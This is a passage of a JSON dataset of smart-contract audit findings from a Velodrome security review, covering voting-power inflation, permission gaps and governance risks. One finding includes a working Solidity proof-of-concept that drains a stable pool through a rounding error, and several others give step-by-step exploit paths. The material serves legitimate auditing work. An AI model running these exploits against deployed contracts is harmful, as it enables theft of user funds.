            "Severity: High Risk"
        ]
    },
    {
        "title": "Inflated voting balance due to duplicated veNFTs within a checkpoint",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Velodrome-Spearbit-Security-Review.pdf",
        "body": "Note: This issue affects VotingEscrow._moveTokenDelegates and VotingEscrow._moveAllDele- gates functions A checkpoint can contain duplicated veNFTs (tokenIDs) under certain circumstances leading to double counting of voting balance. Malicious users could exploit this vulnerability to inflate the voting balance of their accounts and participate in governance and gauge weight voting, potentially causing loss of assets or rewards for other users if the inflated voting balance is used in a malicious manner (e.g. redirect rewards to gauges where attackers have a vested interest). Following is the high-level pseudo-code of the existing _moveTokenDelegates function, which is crucial for under- standing the issue. 1. Assuming moving tokenID=888 from Alice to Bob. 2. Source Code Logic (Moving tokenID=888 out of Alice)  Fetch the existing Alice's token IDs and assign them to srcRepOld  Create a new empty array = srcRepNew  Copy all the token IDs in srcRepOld to srcRepNew except for tokenID=888 3. Destination Code Logic (Moving tokenID=888 into Bob)  Fetch the existing Bobs' token IDs and assign them to dstRepOld  Create a new empty array = dstRepNew  Copy all the token IDs in dstRepOld to dstRepNew  Copy tokenID=888 to dstRepNew The existing logic works fine as long as a new empty array (srcRepNew OR dstRepNew) is created every single time. The code relies on the _findWhatCheckpointToWrite function to return the index of a new checkpoint. function _moveTokenDelegates( ..SNIP.. uint32 nextSrcRepNum = _findWhatCheckpointToWrite(srcRep); uint256[] storage srcRepNew = _checkpoints[srcRep][nextSrcRepNum].tokenIds; However, the problem is that the _findWhatCheckpointToWrite function does not always return the index of a new checkpoint (Refer to Line 1357 below). It will return the last checkpoint if it has already been written once within the same block. function _findWhatCheckpointToWrite(address account) internal view returns (uint32) { uint256 _blockNumber = block.number; uint32 _nCheckPoints = numCheckpoints[account]; if (_nCheckPoints > 0 && _checkpoints[account][_nCheckPoints - 1].fromBlock == _blockNumber) { return _nCheckPoints - 1; } else { return _nCheckPoints; } } If someone triggers the _moveTokenDelegates more than once within the same block (e.g. perform NFT transfer twice to the same person), the _findWhatCheckpointToWrite function will return a new checkpoint in the first transfer but will return the last/previous checkpoint in the second transfer. This will cause the move token delegate logic to be off during the second transfer. 9 First Transfer at Block 1000 Assume the following states: numCheckpoints[Alice] = 1 _checkpoints[Alice][0].tokenIds = [n1, n2] <== Most recent checkpoint numCheckpoints[Bob] = 1 _checkpoints[Bob][0].tokenIds = [n3] <== Most recent checkpoint To move tokenID=2 from Alice to Bob, the _moveTokenDelegates(Alice, Bob, n2) function will be triggered. The _findWhatCheckpointToWrite will return the index of 1 which points to a new array. The end states of the first transfer will be as follows: numCheckpoints[Alice] = 2 _checkpoints[Alice][0].tokenIds = [n1, n2] _checkpoints[Alice][1].tokenIds = [n1] <== Most recent checkpoint numCheckpoints[Bob] = 2 _checkpoints[Bob][0].tokenIds = [n3] _checkpoints[Bob][1].tokenIds = [n2, n3] <== Most recent checkpoint Everything is working fine at this point in time. Second Transfer at Block 1000 (same block) To move tokenID=1 from Alice to Bob, the _moveTokenDelegates(Alice, Bob, n1) function will be triggered. This time round since the last checkpoint block is the same as the current block, the _findWhatCheckpointToWrite function will return the last checkpoint instead of a new checkpoint. The srcRepNew and dstRepNew will end up referencing the old checkpoint instead of a new checkpoint. As such, the srcRepNew and dstRepNew array will reference back to the old checkpoint _checkpoints[Alice][1].tokenIds and _checkpoints[Bob][1].tokenIds respectively. The end state of the second transfer will be as follows: numCheckpoints[Alice] = 3 _checkpoints[Alice][0].tokenIds = [n1, n2] _checkpoints[Alice][1].tokenIds = [n1] <== Most recent checkpoint numCheckpoints[Bob] = 3 _checkpoints[Bob][0].tokenIds = [n3] _checkpoints[Bob][1].tokenIds = [n2, n3, n2, n3, n1] <== Most recent checkpoint Four (4) problems could be observed from the end state: 1. The numCheckpoints is incorrect. Should be two (2) instead to three (3) 2. TokenID=1 has been added to Bob's Checkpoint, but it has not been removed from Alice's Checkpoint 3. Bob's Checkpoint contains duplicated tokenIDs (e.g. there are two TokenID=2 and TokenID=3) 4. TokenID is not unique (e.g. TokenID appears more than once) Since the token IDs within the checkpoint will be used to determine the voting power, the voting power will be inflated in this case as there will be a double count of certain NFTs. function _moveTokenDelegates( ..SNIP.. uint32 nextSrcRepNum = _findWhatCheckpointToWrite(srcRep); uint256[] storage srcRepNew = _checkpoints[srcRep][nextSrcRepNum].tokenIds; 10 Additional Comment about nextSrcRepNum variable and _findWhatCheckpointToWrite function In Line 1320 below, the code wrongly assumes that the _findWhatCheckpointToWrite function will always return the index of the next new checkpoint. The _findWhatCheckpointToWrite function will return the index of the latest checkpoint instead of a new one if block.number == checkpoint.fromBlock. function _moveTokenDelegates( address srcRep, address dstRep, uint256 _tokenId ) internal { if (srcRep != dstRep && _tokenId > 0) { if (srcRep != address(0)) { uint32 srcRepNum = numCheckpoints[srcRep]; uint256[] storage srcRepOld = srcRepNum > 0 ? _checkpoints[srcRep][srcRepNum - 1].tokenIds : _checkpoints[srcRep][0].tokenIds; uint32 nextSrcRepNum = _findWhatCheckpointToWrite(srcRep); uint256[] storage srcRepNew = _checkpoints[srcRep][nextSrcRepNum].tokenIds; Additional Comment about numCheckpoints In Line 1330 below, the function computes the new number of checkpoints by incrementing the srcRepNum by one. However, this is incorrect because if block.number == checkpoint.fromBlock, then the number of checkpoints remains the same and does not increment. function _moveTokenDelegates( address srcRep, address dstRep, uint256 _tokenId ) internal { if (srcRep != dstRep && _tokenId > 0) { if (srcRep != address(0)) { uint32 srcRepNum = numCheckpoints[srcRep]; uint256[] storage srcRepOld = srcRepNum > 0 ? _checkpoints[srcRep][srcRepNum - 1].tokenIds : _checkpoints[srcRep][0].tokenIds; uint32 nextSrcRepNum = _findWhatCheckpointToWrite(srcRep); uint256[] storage srcRepNew = _checkpoints[srcRep][nextSrcRepNum].tokenIds; // All the same except _tokenId for (uint256 i = 0; i < srcRepOld.length; i++) { uint256 tId = srcRepOld[i]; if (tId != _tokenId) { srcRepNew.push(tId); } } numCheckpoints[srcRep] = srcRepNum + 1; }",
        "labels": [
            "Spearbit",
            "Velodrome",
            "Severity: High Risk"
        ]
    },
    {
        "title": "Rebase rewards cannot be claimed after a veNFT expires",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Velodrome-Spearbit-Security-Review.pdf",
        "body": "Note: This issue affects both the RewardsDistributor.claim and RewardsDistributor.claimMany functions A user will claim their rebase rewards via the RewardsDistributor.claim function, which will trigger the VotingE- scrow.deposit_for function. function claim(uint256 _tokenId) external returns (uint256) { if (block.timestamp >= timeCursor) _checkpointTotalSupply(); uint256 _lastTokenTime = lastTokenTime; _lastTokenTime = (_lastTokenTime / WEEK) * WEEK; uint256 amount = _claim(_tokenId, _lastTokenTime); if (amount != 0) { IVotingEscrow(ve).depositFor(_tokenId, amount); tokenLastBalance -= amount; } return amount; } Within the VotingEscrow.deposit_for function, the require statement at line 812 below will verify that the veNFT performing the claim has not expired yet. function depositFor(uint256 _tokenId, uint256 _value) external nonReentrant { LockedBalance memory oldLocked = _locked[_tokenId]; require(_value > 0, \"VotingEscrow: zero amount\"); require(oldLocked.amount > 0, \"VotingEscrow: no existing lock found\"); require(oldLocked.end > block.timestamp, \"VotingEscrow: cannot add to expired lock, withdraw\"); _depositFor(_tokenId, _value, 0, oldLocked, DepositType.DEPOSIT_FOR_TYPE); } If a user claims the rebase rewards after their veNFT's lock has expired, the VotingEscrow.depositFor function will always revert. As a result, the accumulated rebase rewards will be stuck in the RewardsDistributor contract and users will not be able to retrieve them.",
        "labels": [
            "Spearbit",
            "Velodrome",
            "Severity: High Risk"
        ]
    },
    {
        "title": "Claimed rebase rewards of managed NFT are not compounded within LockedManagedReward",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Velodrome-Spearbit-Security-Review.pdf",
        "body": "Rebase rewards of a managed NFT should be compounded within the LockedManagedRewards contract. However, this was not currently implemented. When someone calls the RewardsDistributor.claim with a managed NFT, the claimed rebase rewards will be locked via the VotingEscrow.depositFor function (Refer the VotingEscrow.depositFor function fails to notify the LockedManagedRewards contract of the incoming rewards. Thus, the rewards do not accrue in the LockedManagedRewards. to Line 277 below). However, function claim(uint256 _tokenId) external returns (uint256) { if (block.timestamp >= timeCursor) _checkpointTotalSupply(); uint256 _lastTokenTime = lastTokenTime; _lastTokenTime = (_lastTokenTime / WEEK) * WEEK; uint256 amount = _claim(_tokenId, _lastTokenTime); if (amount != 0) { IVotingEscrow(ve).depositFor(_tokenId, amount); tokenLastBalance -= amount; } return amount; } One of the purposes of the LockedManagedRewards contract is to accrue rebase rewards claimed by the man- aged NFT so that the users will receive their pro-rata portion of the rebase rewards based on their contribu- tion to the managed NFT when they withdraw their normal NFTs from the managed NFT via the VotingE- scrow.withdrawManaged function. 13 /// @inheritdoc IVotingEscrow function withdrawManaged(uint256 _tokenId) external nonReentrant { ..SNIP.. uint256 _reward = IReward(_lockedManagedReward).earned(address(token), _tokenId); ..SNIP.. // claim locked rewards (rebases + compounded reward) address[] memory rewards = new address[](1); rewards[0] = address(token); IReward(_lockedManagedReward).getReward(_tokenId, rewards); If the rebase rewards are not accrued in the LockedManagedRewards, users will not receive their pro-rata portion of the rebase rewards during withdrawal.",
        "labels": [
            "Spearbit",
            "Velodrome",
            "Severity: High Risk"
        ]
    },
    {
        "title": "Malicious users could deposit normal NFTs to a managed NFT on behalf of others without their permission",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Velodrome-Spearbit-Security-Review.pdf",
        "body": "The VotingEscrow.depositManaged function did not verify that the caller (msg.sender) is the owner of the _tokenId. As a result, a malicious user can deposit normal NFTs to a managed NFT on behalf of others without their permission. function depositManaged(uint256 _tokenId, uint256 _mTokenId) external nonReentrant { require(escrowType[_mTokenId] == EscrowType.MANAGED, \"VotingEscrow: can only deposit into managed nft\"); ,! require(!deactivated[_mTokenId], \"VotingEscrow: inactive managed nft\"); require(escrowType[_tokenId] == EscrowType.NORMAL, \"VotingEscrow: can only deposit normal nft\"); require(!voted[_tokenId], \"VotingEscrow: nft voted\"); require(ownershipChange[_tokenId] != block.number, \"VotingEscrow: flash nft protection\"); require(_balanceOfNFT(_tokenId, block.timestamp) > 0, \"VotingEscrow: no balance to deposit\"); ..SNIP.. The owner of a normal NFT will have their voting balance transferred to a malicious managed NFT, resulting in loss of rewards and voting power for the victim. Additionally, a malicious owner of a managed NFT could aggregate 14 voting power of the victim's normal NFTs, and perform malicious actions such as stealing the rewards from the victims or use its inflated voting power to pass malicious proposals.",
        "labels": [
            "Spearbit",
            "Velodrome",
            "Severity: High Risk"
        ]
    },
    {
        "title": "First liquidity provider of a stable pair can DOS the pool",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Velodrome-Spearbit-Security-Review.pdf",
        "body": "The invariant k of a stable pool is calculated as follows Pair.sol#L505 function _k(uint256 x, uint256 y) internal view returns (uint256) { if (stable) { uint256 _x = (x * 1e18) / decimals0; uint256 _y = (y * 1e18) / decimals1; uint256 _a = (_x * _y) / 1e18; uint256 _b = ((_x * _x) / 1e18 + (_y * _y) / 1e18); return (_a * _b) / 1e18; // x3y+y3x >= k } else { return x * y; // xy >= k } } The value of _a = (x * y ) / 1e18 = 0 due to rounding error when x*y < 1e18. The rounding error can lead to the invariant k of stable pools equals zero, and the trader can steal whatever is left in the pool. The first liquidity provider can DOS the pair by: 1.mint a small amount of liquidity to the pool, 2. Steal whatever is left in the pool, 3. Repeat step 1, and step 2 until the overflow of the total supply. To prevent the issue of rounding error, the reserve of a pool should never go too small. The mint function which was borrowed from uniswapV2 has a minimum liquidity check of sqrt(a * b) > MINIMUM_LIQUIDITY; This, however, isn't safe enough to protect the invariant formula of stable pools. Pair.sol#L344-L363 uint256 internal constant MINIMUM_LIQUIDITY = 10**3; // ... function mint(address to) external nonReentrant returns (uint256 liquidity) { // ... uint256 _amount0 = _balance0 - _reserve0; uint256 _amount1 = _balance1 - _reserve1; uint256 _totalSupply = totalSupply(); if (_totalSupply == 0) { liquidity = Math.sqrt(_amount0 * _amount1) - MINIMUM_LIQUIDITY; //@audit what about the fee? _mint(address(1), MINIMUM_LIQUIDITY); // permanently lock the first MINIMUM_LIQUIDITY tokens - ,! cannot be address(0) // ... } This is the POC of an exploit extended from Pair.t.sol 15 contract PairTest is BaseTest { // ... function drainPair(Pair pair, uint initialFraxAmount, uint initialDaiAmount) internal { DAI.transfer(address(pair), 1); uint amount0; uint amount1; if (address(DAI) < address(FRAX)) { amount0 = 0; amount1 = initialFraxAmount - 1; } else { amount1 = 0; amount0 = initialFraxAmount - 1; } pair.swap(amount0, amount1, address(this), new bytes(0)); FRAX.transfer(address(pair), 1); if (address(DAI) < address(FRAX)) { amount0 = initialDaiAmount; // initialDaiAmount + 1 - 1 amount1 = 0; } else { amount1 = initialDaiAmount; // initialDaiAmount + 1 - 1 amount0 = 0; } pair.swap(amount0, amount1, address(this), new bytes(0)); } function testDestroyPair() public { deployCoins(); deal(address(DAI), address(this), 100 ether); deal(address(FRAX), address(this), 100 ether); deployFactories(); Pair pair = Pair(factory.createPair(address(DAI), address(FRAX), true)); for(uint i = 0; i < 10; i++) { DAI.transfer(address(pair), 10_000_000); FRAX.transfer(address(pair), 10_000_000); // as long as 10_000_000^2 < 1e18 uint liquidity = pair.mint(address(this)); console.log(\"pair:\", address(pair), \"liquidity:\", liquidity); console.log(\"total liq:\", pair.balanceOf(address(this))); drainPair(pair, FRAX.balanceOf(address(pair)) , DAI.balanceOf(address(pair))); console.log(\"DAI balance:\", DAI.balanceOf(address(pair))); console.log(\"FRAX balance:\", FRAX.balanceOf(address(pair))); require(DAI.balanceOf(address(pair)) == 1, \"should drain DAI balance\"); require(FRAX.balanceOf(address(pair)) == 2, \"should drain FRAX balance\"); } DAI.transfer(address(pair), 1 ether); FRAX.transfer(address(pair), 1 ether); vm.expectRevert(); pair.mint(address(this)); } }",
        "labels": [
            "Spearbit",
            "Velodrome",
            "Severity: High Risk"
        ]
    },
    {
        "title": "Certain functions are unavailable after opting in to the \"auto compounder",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Velodrome-Spearbit-Security-Review.pdf",
        "body": "Certain features (e.g., delegation, governance voting) of a veNFT would not be available if the veNFT is transferred to the auto compounder. Let x be a managed veNFT. When an \"auto compounder\" is created, ownership of x is transferred to the AutoCom- pounder contract, and any delegation within x is cleared. The auto compounder can perform gauge weight voting using x via the provided AutoCompounder.vote function. However, it loses the ability to perform any delegation with x because the AutoCompounder contract does not contain a function that calls the VotingEscrow.delegate function. Only the owner of x, the AutoCompounder contract, can call the VotingEscrow.delegate function. x also loses the ability to vote on governance proposals as the existing AutoCompounder contract does not support this feature. Once the owner of the managed NFTs has opted in to the \"auto compounder,\" it is not possible for them to subsequently \"opt out.\" Consequently, if they need to exercise delegation and governance voting, they will be unable to do so, exacerbating the impact. 17",
        "labels": [
            "Spearbit",
            "Velodrome",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "Claimable gauge distributions are locked when killGauge is called",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Velodrome-Spearbit-Security-Review.pdf",
        "body": "When a gauge is killed, the claimable[_gauge] key value is cleared. Because any rewards received by the Voter contract are indexed and distributed in proportion to each pool's weight, this claimable amount is permanently locked within the contract.",
        "labels": [
            "Spearbit",
            "Velodrome",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "Bribe and fee token emissions can be gamed by users",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Velodrome-Spearbit-Security-Review.pdf",
        "body": "A user may vote or reset their vote once per epoch. Votes persist across epochs and once a user has distributed their votes among their chosen pools, the poke() function may be called by any user to update the target user's decayed veNFT token balance. However, the poke() function is not hooked into any of the reward distribution contracts. As a result, a user is incentivized to vote as soon as they create their lock and avoid re-voting in subsequent epochs. The amount deposited via Reward._deposit() does not decay linearly as how it is defined under veToken mechanics. Therefore, users could continue to earn trading fees and bribes even after their lock has expired. Simultaneously, users can poke() other users to lower their voting weight and maximize their own earnings.",
        "labels": [
            "Spearbit",
            "Velodrome",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "Compromised or malicious owner can drain the VotingEscrow contract of VELO tokens",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Velodrome-Spearbit-Security-Review.pdf",
        "body": "The FactoryRegistry contract is an Ownable contract with the ability to control the return value of the managedRewardsFactory() function. As such, whenever createManagedLockFor() is called in VotingEscrow, the FactoryRegistry contract queries the managedRewardsFactory() function and subsequently calls createRe- wards() on this address. If ownership of the FactoryRegistry contract is compromised or malicious, the createRewards() external call can return any arbitrary _lockedManagedReward address which is then given an infinite token approval. As a result, it's possible for all locked VELO tokens to be drained and hence, this poses a significant centralization risk to the protocol.",
        "labels": [
            "Spearbit",
            "Velodrome",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "Unsafe casting in RewardsDistributor leads to underflow of veForAt",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Velodrome-Spearbit-Security-Review.pdf",
        "body": "Solidity does not revert when casting a negative number to uint. Instead, it underflows to a large number. In the RewardDistributor contract, the balance of a token at specific time is calculated as follows IVotingEscrow.Point memory pt = IVotingEscrow(_ve).userPointHistory(_tokenId, epoch); Math.max(uint256(int256(pt.bias - pt.slope * (int128(int256(_timestamp - pt.ts))))), 0); This supposes to return zero when the calculated balance is a negative number. However, it underflows to a large number. This would lead to incorrect reward distribution if third-party protocols depend on this function, or when further updates make use of this codebase.",
        "labels": [
            "Spearbit",
            "Velodrome",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "Proposals can be griefed by front-running and canceling",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Velodrome-Spearbit-Security-Review.pdf",
        "body": "Because the Governor uses OZ's Implementation, a griefter can front-run a valid proposal with the same settings and then immediately cancel it. You can avoid the grief by writing a macro contract that generates random descriptions to avoid the front-run. See: code-423n4/2022-09-nouns-builder-findings#182.",
        "labels": [
            "Spearbit",
            "Velodrome",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "pairFor does not correctly sort tokens when overriding for SinkConverter",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Velodrome-Spearbit-Security-Review.pdf",
        "body": "The router will always search for pairs by sorting tokenA and TokenB. Notably, for the velo and Velo2 pair, the Router will not perform the sorting 21 //Router.sol#L69-L73 if (factory == defaultFactory) { if ((tokenA == IPairFactory(defaultFactory).velo()) && (tokenB == ,! IPairFactory(defaultFactory).veloV2())) { return IPairFactory(defaultFactory).sinkConverter(); } } Meaning that the pair for Velo -> Velo2 will be the Sink but the pair for Velo2 -> Velo will be some other pair. Additionally, you can front-run a call to setSinkConverter() by calling createPair() with the same parameters. How- ever, the respective values for getPair() would be overwritten with the sinkConverter address. This could lead to some weird and unexpected behaviour as we would still have an invalid Pair contract for the v1 and v2 velo tokens.",
        "labels": [
            "Spearbit",
            "Velodrome",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "Inconsistent between balanceOfNFT, balanceOfNFTAt and _balanceOfNFT functions",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Velodrome-Spearbit-Security-Review.pdf",
        "body": "The balanceOfNFT function implements a flash-loan protection that returns zero voting balance if ownershipChange[_tokenId] == block.number. However, this was not consistently applied to the balanceOfNF- TAt and _balanceOfNFT functions. VotingEscrow.sol function balanceOfNFT(uint256 _tokenId) external view returns (uint256) { if (ownershipChange[_tokenId] == block.number) return 0; return _balanceOfNFT(_tokenId, block.timestamp); } As a result, Velodrome or external protocols calling the balanceOfNFT and balanceOfNFTAt external functions will receive different voting balances for the same veNFT depending on which function they called. Additionally, the internal _balanceOfNFT function, which does not have flash-loan protection, is called by the VotingEscrow.getVotes function to compute the voting balance of an account. The VotingEscrow.getVotes function appears not to be used in any in-scope contracts, however, this function might be utilized by some exter- nal protocols or off-chain components to tally the votes. If that is the case, a malicious user could flash-loan the veNFTs to inflate the voting balance of their account.",
        "labels": [
            "Spearbit",
            "Velodrome",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "Nudge check will break once limit is reached",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Velodrome-Spearbit-Security-Review.pdf",
        "body": "Because you're checking both sides, once oldRate reaches the MAX_RATE, every new nudge call will revert. Meaning that if _newRate ever get's to MAXIMUM_TAIL_RATE or MINIMUM_TAIL_RATE, nudge will stop working.",
        "labels": [
            "Spearbit",
            "Velodrome",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "ownershipChange can be sidestepped",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Velodrome-Spearbit-Security-Review.pdf",
        "body": "The check there is to prevent adding to managed after a transfer from or creation require(ownershipChange[_tokenId] != block.number, \"VotingEscrow: flash nft protection\"); However, it doesn't prevent adding and removing from other managed tokens, merging, or splitting. For this reason, we can sidestep the lock by splitting Because ownershipChange is updated exclusively on _transferFrom, we can side-step it being set by splitting the lock into a new one which will not have the lock.",
        "labels": [
            "Spearbit",
            "Velodrome",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "The fromBlock variable of a checkpoint is not initialized",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Velodrome-Spearbit-Security-Review.pdf",
        "body": "A checkpoint contains a fromBlock variable which stores the block number the checkpoint is created. /// @notice A checkpoint for marking delegated tokenIds from a given block struct Checkpoint { uint256 fromBlock; uint256[] tokenIds; } However, it was found that the fromBlock variable of a checkpoint was not initialized anywhere in the codebase. Therefore, any function that relies on the fromBlock of a checkpoint will break. The VotingEscrow._findWhatCheckpointToWrite and VotingEscrow.getPastVotesIndex functions were found to rely on the fromBlock variable of a checkpoint for computation. The following is a list of functions that calls these two affected functions. _findWhatCheckpointToWrite -> _moveTokenDelegates -> _transferFrom _findWhatCheckpointToWrite -> _moveTokenDelegates -> _mint _findWhatCheckpointToWrite -> _moveTokenDelegates -> _burn _findWhatCheckpointToWrite -> _moveAllDelegates -> _delegate -> delegate/delegateBySig getPastVotesIndex -> getTokenIdsAt getPastVotesIndex -> getPastVotes -> GovernorSimpleVotes._getVotes Instance 1 - VotingEscrow._findWhatCheckpointToWrite function The VotingEscrow._findWhatCheckpointToWrite function verifies if the fromBlock of the latest checkpoint of an account is equal to the current block number. If true, the function will return the index number of the last checkpoint. function _findWhatCheckpointToWrite(address account) internal view returns (uint32) { uint256 _blockNumber = block.number; uint32 _nCheckPoints = numCheckpoints[account]; if (_nCheckPoints > 0 && _checkpoints[account][_nCheckPoints - 1].fromBlock == _blockNumber) { return _nCheckPoints - 1; } else { return _nCheckPoints; } } As such, this function does not work as intended and will always return the index of a new checkpoint. Instance 2 - VotingEscrow.getPastVotesIndex function The VotingEscrow.getPastVotesIndex function relies on the fromBlock of the latest checkpoint for optimization purposes. If the request block number is the most recently updated checkpoint, it will return the latest index immediately and skip the binary search. Since the fromBlock variable is not populated, the optimization will not work. 24 function getPastVotesIndex(address account, uint256 blockNumber) public view returns (uint32) { uint32 nCheckpoints = numCheckpoints[account]; if (nCheckpoints == 0) { return 0; } // First check most recent balance if (_checkpoints[account][nCheckpoints - 1].fromBlock <= blockNumber) { return (nCheckpoints - 1); } // Next check implicit zero balance if (_checkpoints[account][0].fromBlock > blockNumber) { return 0; } uint32 lower = 0; uint32 upper = nCheckpoints - 1; while (upper > lower) { uint32 center = upper - (upper - lower) / 2; // ceil, avoiding overflow Checkpoint storage cp = _checkpoints[account][center]; if (cp.fromBlock == blockNumber) { return center; } else if (cp.fromBlock < blockNumber) { lower = center; } else { upper = center - 1; } } return lower; }",
        "labels": [
            "Spearbit",
            "Velodrome",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "Double voting by shifting the voting power between managed and normal NFTs",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Velodrome-Spearbit-Security-Review.pdf",
        "body": "Owners of normal NFTs and managed NFTs could potentially collude to double vote, which affects the fairness of the gauge weight voting. A group of malicious veNFT owners could exploit this and use the inflated voting balance to redirect the VELO emission to gauges where they have a vested interest, causing losses to other users. The following shows that it is possible to increase the weight of a pool by 2000 with a 1000 voting balance within a single epoch by shifting the voting power between managed and normal NFTs. For simplicity's sake, assume the following  Alice is the owner of a managed NFT (tokenID=888)  Bob is the owner of a normal NFT (tokenID=999)  Alice's managed NFT (tokenID=888) only consists of one (1) normal NFT (tokenID=999) that belongs to Bob being locked up. The following steps are executed within the same epoch. At the start, the state is as follows:  Voting power of Alice's managed NFT (tokenID=888) is 1000 25  The 1000 voting came from the normal NFT (tokenID=999) during the deposit  weights[_tokenId][_mTokenId] = _weight | weights[999][888] = 1000;  Voting power of Bob's normal NFT (tokenID=999) is zero (0)  Weight of Pool X = 0 Alice calls Voter.vote function with his managed NFT (tokenID=888), and increases the weight of Pool X by 1000. Subsequently, the lastVoted[_tokenId] = _timestamp at Line 222 in the Voter.vote function will be set, and the onlyNewEpoch modifier will ensure Alice cannot use the same managed NFT (tokenID=888) to vote again in the current epoch. However, Bob could call the VotingEscrow.withdrawManaged to withdraw his normal NFT (tokenID=999) from the managed NFT (tokenID=888). Within the function, it will call the internal _checkpoint function to \"transfer\" the voting power from managed NFT (tokenID=888) to normal NFT (tokenID=999). At this point, the state is as follows:  Voting power of Alice's managed NFT (tokenID=888) is zero (0)  Voting power of Bob's normal NFT (tokenID=999) is 1000  Weight of Pool X = 1000 Bob calls Voter.vote function with his normal NFT (tokenID=999) and increases the weight of Pool X by 1000. Since normal NFT (tokenID=999) has not voted in the current epoch, it is allowed to vote. The weight of Pool X becomes 2000. It was observed that a mechanism is in place to punish and disincentivize malicious behaviors from a managed NFT owner. The protocol's emergency council could deactivate Managed NFTs involved in malicious activities via the VotingEscrow.setManagedState function. In addition, the ability to create a managed NFT is restricted to only an authorized manager and protocol's governor. These factors help to mitigate some risks related to this issue to a certain extent.",
        "labels": [
            "Spearbit",
            "Velodrome",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "MetaTX is using the incorrect Context",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Velodrome-Spearbit-Security-Review.pdf",
        "body": "Throughout the codebase, the code uses Context for _msgSender() The implementation chosen will resolve each _msgSender() to msg.sender which is inconsistent with the goal of allowing MetaTX.",
        "labels": [
            "Spearbit",
            "Velodrome",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "depositFor function should be restricted to approved NFT types",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Velodrome-Spearbit-Security-Review.pdf",
        "body": "The depositFor function was found to accept NFT of all types (normal, locked, managed) without restriction. function depositFor(uint256 _tokenId, uint256 _value) external nonReentrant { LockedBalance memory oldLocked = _locked[_tokenId]; require(_value > 0, \"VotingEscrow: zero amount\"); require(oldLocked.amount > 0, \"VotingEscrow: no existing lock found\"); require(oldLocked.end > block.timestamp, \"VotingEscrow: cannot add to expired lock, withdraw\"); _depositFor(_tokenId, _value, 0, oldLocked, DepositType.DEPOSIT_FOR_TYPE); } Instance 1 - Anyone can call depositFor against a locked NFT Users should not be allowed to increase the voting power of a locked NFT by calling the depositFor function as locked NFTs are not supposed to vote. Thus, any increase in the voting balance of locked NFTs will not increase the gauge weight, and as a consequence, the influence and yield of the deposited VELO will be diminished. In addition, the locked balance will be overwritten when the veNFT is later withdrawn from the managed veNFT, resulting in a loss of funds. Instance 2 - Anyone can call depositFor against a managed NFT Only the RewardsDistributor.claim function should be allowed to call depositFor function against a managed NFT to process rebase rewards claimed and to compound the rewards into the LockedManagedReward contract. However, anyone could also increase the voting power of a managed NFT directly by calling depositFor with a tokenId of a managed NFT, which breaks the invariant.",
        "labels": [
            "Spearbit",
            "Velodrome",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "Lack of vetoer can lead to 51% attack",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Velodrome-Spearbit-Security-Review.pdf",
        "body": "The veto power is important functionality in a governance system in order to protect from malicious proposals. However there is lack of vetoer in VeloGovernor , this might lead to Velodrome losing their veto power unintentionally and open to 51% attack. With 51% attack a malicous actor can change the governor in Voter contract or by pass the tokens whitelist adding new gauge with malicious token. References  dialectic.ch/editorial/nouns-governance-attack-2  code4rena.com/reports/2022-09-nouns-builder/#m-11-loss-of-veto-power-can-lead-to-51-attack",
        "labels": [
            "Spearbit",
            "Velodrome",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "Compromised or malicious owner can siphon rewards from the Voter contract",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Velodrome-Spearbit-Security-Review.pdf",
        "body": "The createGauge() function takes a _gaugeFactory parameter which is checked to be approved by the FactoryRegistry contract. However, the owner of this contract can approve any arbitrary FactoryRegistry contract, hence the return value of the IGaugeFactory(_gaugeFactory).createGauge() call may return an EOA which steals rewards every time notifyRewardAmount() is called.",
        "labels": [
            "Spearbit",
            "Velodrome",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Missing nonReentrant modifier on a state changing checkpoint function",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Velodrome-Spearbit-Security-Review.pdf",
        "body": "The checkpoint() function will call the internal _checkpoint() function which ultimately fills the point history and potentially updates the epoch state variable.",
        "labels": [
            "Spearbit",
            "Velodrome",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Close to half of the trading fees may be paid one epoch late",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Velodrome-Spearbit-Security-Review.pdf",
